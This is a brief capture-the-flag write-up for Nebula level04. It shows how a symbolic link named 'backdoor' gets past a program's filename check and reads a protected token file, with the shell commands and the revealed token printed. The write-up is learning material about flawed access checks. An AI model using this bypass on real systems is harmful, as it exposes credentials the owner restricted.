# About
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.

# Exploitation
```bash
level04@nebula:~$ /home/flag04/flag04 token
You may not access 'token'
```
This program makes me not able to read token file(that contains password).

To bypass that, my method is simple.

```bash
level04@nebula:~$ ln -s /home/flag04/token /home/level04/backdoor
level04@nebula:~$ ls -l
total 0
lrwxrwxrwx 1 level04 level04 18 2017-12-05 14:10 backdoor -> /home/flag04/token
level04@nebula:~$ /home/flag04/flag04 backdoor
06508b5e-8909-4f38-b630-fdb148a848a2
```
Make simbolic link file and pass that name.
